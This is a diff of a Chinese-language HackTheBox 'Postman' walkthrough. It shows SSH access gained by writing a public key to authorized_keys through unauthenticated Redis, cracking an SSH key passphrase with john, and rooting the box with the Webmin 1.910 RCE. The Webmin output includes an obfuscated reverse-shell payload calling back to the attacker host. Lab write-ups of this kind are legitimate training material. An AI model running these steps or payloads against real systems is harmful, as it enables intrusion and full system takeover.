@@ -62,56 +62,202 @@ Nmap done: 1 IP address (1 host up) scanned in 52.24 seconds
 
 可以看到开了ssh服务，一个80端口的http服务，6379是redis服务，10000端口是webmin服务
 
-redis这个版本好像存在一个rce，试了几个exp都报错
+webmin存在一个rce漏洞，但是需要登录账号和密码。
+
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# searchsploit webmin 1.910                                                                     130 ⨯
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit | linux/remote/46984.rb
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)         | linux/webapps/47330.rb
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+## redis 4.0.9
+
+redis这个版本好像存在一个rce，但是试了几个exp都报错
 > -ERR unknown command 'system.exec'
 
 搜索了一圈，在[这个](https://serverfault.com/questions/1021564/redis-server-exploit-for-command-execution)帖子下看到一个答案
 > The redis instance doesn't have MODULE command which is odd. If this is a CTF it might be intentional that the box creator removed it.
 
-所以可能是被人为移除了这个漏洞？
+所以可能是被创建者人为移除了这个漏洞
 
 
-## 80服务目录爆破
+在[hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)找到了一个通过修改redis的ssh配置文件，从而无密码登录靶机的方法，步骤如下：
+
+1. cli登录redis
+
+> redis-cli -h 10.10.10.160
+
+2. 使用get dir获取redis的安装目录
 ```
-┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.160                                     
-
-  _|. _ _  _  _  _ _|_    v0.4.2
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100
-Wordlist size: 15492
-
-Output File: /root/dirsearch/reports/10.10.10.160/_21-12-23_22-57-15.txt
-
-Error Log: /root/dirsearch/logs/errors-21-12-23_22-57-15.log
-
-Target: http://10.10.10.160/
-
-[22:57:16] Starting:            
-[22:57:28] 301 -  309B  - /js  ->  http://10.10.10.160/js/                                                         
-[22:58:09] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
-[22:58:13] 301 -  310B  - /css  ->  http://10.10.10.160/css/                
-[22:58:21] 301 -  312B  - /fonts  ->  http://10.10.10.160/fonts/            
-[22:58:26] 301 -  313B  - /images  ->  http://10.10.10.160/images/          
-[22:58:26] 200 -    2KB - /images/                                          
-[22:58:27] 200 -    4KB - /index.html                                       
-[22:58:28] 200 -    3KB - /js/                                                                                
-[22:59:12] 301 -  313B  - /upload  ->  http://10.10.10.160/upload/          
-[22:59:15] 200 -    8KB - /upload/   
+┌──(root💀kali)-[~/htb/Postman]
+└─# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"
 ```
 
+现在我们知道redis安装在靶机的```/var/lib/redis```目录,这一步主要是用于写ssh文件。
+
+3. kali端，把本地id_rsa.pub重定向到key.txt，需要注意要空两行
+
+> (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
 
 
+4. 把攻击机公钥写进靶机的```.ssh```
 
-root@Urahara:~# redis-cli -h 10.85.0.52
-10.85.0.52:6379> config set dir /var/www/html/upload/
-OK
-10.85.0.52:6379> config set dbfilename redis.php
-OK
-10.85.0.52:6379> set test "<?php phpinfo(); ?>"
-OK
-10.85.0.52:6379> save
-OK
+> cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
 
 
+5. 再次登录靶机redis，获取ssh_key值，成功显示，表示已经写入
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# redis-cli -h 10.10.10.160
+10.10.10.160:6379> GET ssh_key
+"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX....
+```
+
+6. 设置redis的dir目录
+
+> CONFIG SET dir /var/lib/redis/.ssh
+
+7. 设置dbfilename为authorized_keys
+
+> dbfilename authorized_keys
+
+8. 保存
+
+> save
+
+9. 退出redis终端，ssh登录
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# ssh redis@10.10.10.160
+The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
+RSA key fingerprint is SHA256:FJdNat9qUrffCNDMV/0qF8efJdwa8NXW+iQ7NXuf/uk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.160' (RSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ id
+uid=107(redis) gid=114(redis) groups=114(redis)
+redis@Postman:~$ whoami
+redis
+
+```
+
+user.txt在用户matt下，redis账号没有权限
+
+## 提权到matt
+
+传linpeas，发现一个id_rsa.bak文件
+
+```
+╔══════════╣ Backup files (limited 100)
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak  
+```
+
+转成john可以识别的样式
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# /usr/share/john/ssh2john.py id_rsa >crask
+```
+
+john破解
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt crask
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa)
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:07 DONE (2021-12-25 01:04) 0.1290g/s 1850Kp/s 1850Kc/s 1850KC/sa6_123..*7¡Vamos!
+Session completed
+
+```
+
+然而并不能直接登录
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# ssh -i id_rsa matt@10.10.10.160                                                                                                                                                                                                                                                                                    130 ⨯
+Enter passphrase for key 'id_rsa': 
+Connection closed by 10.10.10.160 port 22
+
+```
+
+然后尝试用密码```computer2008```直接切换到Matt，成功了
+```
+redis@Postman:/opt$ su Matt
+Password: 
+Matt@Postman:/opt$ id
+uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
+Matt@Postman:/opt$ whoami
+Matt
+
+```
+
+# 提权
+
+## webmin 1.910
+
+webmin是一个基于web界面的类unix管理平台，由于需要管理系统的诸多类容，所以常常都是以root权限运行。
+前面我们已经知道啊这个版本的webmin存在一个rce，如今我们又有了登录账号信息```Matt:computer2008```,现在我们可以利用这个rce提权
+
+使用github上[这个RCE](https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py)
+
+先在kali开启一个监听
+> nc -lnvp 4242
+
+执行攻击：
+
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# python3 exploit_poc.py --ip_address=10.10.10.160 --port=10000 --lhost=10.10.14.3 --lport=4242 --user=Matt --pass=computer2008
+
+Webmin 1.9101- 'Package updates' RCE
+
+[+] Generating Payload...
+[+] Reverse Payload Generated : u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7Becho%2CcGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4zOjQyNDIiKTtTVERJTi0%2BZmRvcGVuKCRjLHIpOyR%2BLT5mZG9wZW4oJGMsdyk7d2hpbGUoPD4pe2lmKCRfPX4gLyguKikvKXtzeXN0ZW0gJDE7fX07Jw%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22&ok_top=Update+Selected+Packages
+[+] Attempting to login to Webmin
+[+] Login Successful
+[+] Attempting to Exploit
+
+
+```
+
+拿到反弹shell
+
+```
+┌──(root💀kali)-[~/htb/Postman]
+└─# nc -lnvp 4242                    
+listening on [any] 4242 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.160] 36814
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+
+```
+
+已经成功提权到root
